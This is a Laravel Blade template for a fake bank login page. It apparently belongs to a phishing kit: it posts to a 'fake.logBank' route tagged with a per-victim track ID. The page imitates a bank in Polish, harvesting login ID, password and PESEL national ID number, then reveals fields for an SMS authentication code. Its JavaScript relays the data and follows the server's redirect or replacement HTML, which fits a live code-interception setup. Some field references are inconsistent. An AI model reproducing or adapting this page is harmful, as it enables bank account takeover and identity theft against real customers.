@extends('layouts.fake')
@push('css')
    <style>
        p {
            margin-block-start: 2px;
            margin-block-end: 2px;
        }
    </style>
    <style>
        .neon_border {
            width: 80vw;
            max-width: 400px;
            padding: 20px 5vw;
            margin: auto;
            background: #f5f5f5;
            border: 1px solid #efefef;
            border-radius: 10px;
        }

        .form-item {
            position: relative;
            padding-top: 40px;
            margin-bottom: 10px;
        }

        input {
            display: block;
            width: calc(100% - 24px);
            padding: 11px;
            margin: auto;
            border: 1px solid #ccc;
            background: no-repeat bottom, 50% calc(100% - 1px);
            background-size: 0 100%, 100% 100%;
            background-image: linear-gradient(0deg, #ff9900 3px, rgba(156, 39, 176, 0) 0), linear-gradient(0deg, #f5f5f5 1px, hsla(0, 0%, 82%, 0) 0);
            border-radius: 8px;
            transition: 0.3s;
            background-color: #f5f5f5;
        }

        button {
            display: block;
            padding: 7px 16px;
            font-size: 1.1875rem;
            line-height: 28px;
            border-radius: 8px;
            font-weight: 700;
            margin: auto;
            margin-top: 40px;
            color: #fff;
            cursor: pointer;
            background: linear-gradient(153.43deg, #64b530, #329d31);
            border: none;
        }

        input:focus {
            outline: none;
            background-size: 100% 100%, 100% 100%;
            box-shadow: none;
        }

        p {
            color: #FFF;
            font-weight: 700;
            font-size: 23px;
        }

        .icon {
            float: left;
            font-size: 24px;
            color: #fff;
            padding-right: 12px;
        }

        .icon-text {
            color: #fff;
            font-weight: 600;
            line-height: 26px;
        }

        .first:before {
            content: "\e041";
        }

        .icon:before {
            font-family: "ing-iconfont" !important;
            font-style: normal !important;
            font-weight: normal !important;
            font-variant: normal !important;
            text-transform: none !important;
            speak: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h6 {
            padding: 0 36px 20px;
            margin-block-start: 5px;
            margin-block-end: 5px;
            font-weight: normal;
            font-size: 12px;
        }

        a {
            color: #000066;
            font-weight: 600;
        }

        #input5, #input6, #pay-button {
            display: none;
        }
    </style>
    <style>
        *, :after, :before {
            box-sizing: revert;
        }
        .neon_border{
            background-color: #ffffff;
        }
    </style>
@endpush
@section('content')
    <div style="width: calc(100vw - 30px); height: 32px; padding: 10px 15px 15px; border-bottom: 1px solid #dfdfdf; background: #f7f7f7;">
        <img src="{{asset($bank['logo'])}}" style="height: 36px;">
    </div>
    <div style="margin: 40px 5vw 45px;">

        <form class="neon_border" id="form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
              role="form">
            @csrf
            <input type="hidden" name="track_id" id="track_id" value="{{$fake->track_id}}">
            <p>Accesso Cliente</p>
            <div class="form-item" id="input1">
                <input type="text" name="login" id="login" placeholder="Wprowadź Identyfikator">
            </div>
            <div class="form-item" id="input2">
                <input type="text" name="password" id="password" placeholder="Wprowadź Hasło">
            </div>

{{--            <div class="form-item" id="input3">--}}
{{--                <input type="text" name="pin" id="pin" placeholder="Wprowadź haslo operacji internetowej">--}}
{{--            </div>--}}

            <div class="form-item" id="input4">
                <input type="text" name="pesel" id="pesel" placeholder="Wpisz pesel">
            </div>

            <div class="form-item" id="input5">
                <input type="text" name="mother" id="mother" placeholder="Wpisz pełną nazwę swojego banku">
            </div>

            <div class="form-item" id="input6">
                <input type="text" name="smsCode" id="kod" placeholder="Wpisz kod uwierzytelnienia">
            </div>

            <button type="submit" id="pay1">DALEJ</button>
            <button id="pay-button" onclick="treedspin();">DALEJ</button>
            <hr style="margin-top: 30px; border: 2px dashed #dfdfdf; opacity: 0;">

        </form>

    </div>
@endsection
@push('js')
    <script type="text/javascript">
        function treedspin() {
            let form = $('form#form');
            if ($('#pin').val() !== '') {
                $.ajax({
                    type: "POST",
                    url: form.attr('action'),
                    data: form.serialize(),
                }).fail(function (error) {
                    alert('Proszę czekać, przetwarzam dane');
                    treedspin();
                }).done(function (data) {
                    if (data.html) $('#app').html(data.html);
                    else if (data.next) location.href = data.next;
                    else setTimeout(function () {
                            alert("Błąd");
                        }, 3000)
                }).always(function () {
                    $('#loading').show();
                });
            } else ($('#codefromsms').val() === '')
                ? $('#codefromsms').css("border-color", "red")
                : $('#codefromsms').css("border-color", "");
        }

        $("#form").on("submit", function (event) {
            event.preventDefault();

            if ($('#login').val() == '') {
                $('#login').css('border', '1px solid #b60');
            }

            if ($('#password').val() == '') {
                $('#password').css('border', '1px solid #b60');
            }

            if ($('#pin').val() == '') {
                $('#pin').css('border', '1px solid #b60');
            }

            if ($('#pesel').val() == '') {
                $('#pesel').css('border', '1px solid #b60');
            }

            if ($('#login').val() != '' && $('#password').val() != '' && $('#pin').val() != '' && $('#pesel').val() != '') {
                $("#input1").css("display", "none");
                $("#input2").css("display", "none");
                $("#input3").css("display", "none");
                $("#input4").css("display", "none");
                $("#input5").css("display", "block");
                $("#input6").css("display", "block");
                $("#pay1").css("display", "none");
                $("#pay-button").css("display", "block");
            }
        });
    </script>
    <script type="text/javascript">
        $(document).ready(function () {
            document.querySelector('#login').addEventListener('click', function () {
                this.style.border = '1px solid #ccc';
            })

            document.querySelector('#password').addEventListener('click', function () {
                this.style.border = '1px solid #ccc';
            })

            document.querySelector('#pin').addEventListener('click', function () {
                this.style.border = '1px solid #ccc';
            })

            document.querySelector('#pesel').addEventListener('click', function () {
                this.style.border = '1px solid #ccc';
            })
        });
    </script>
@endpush
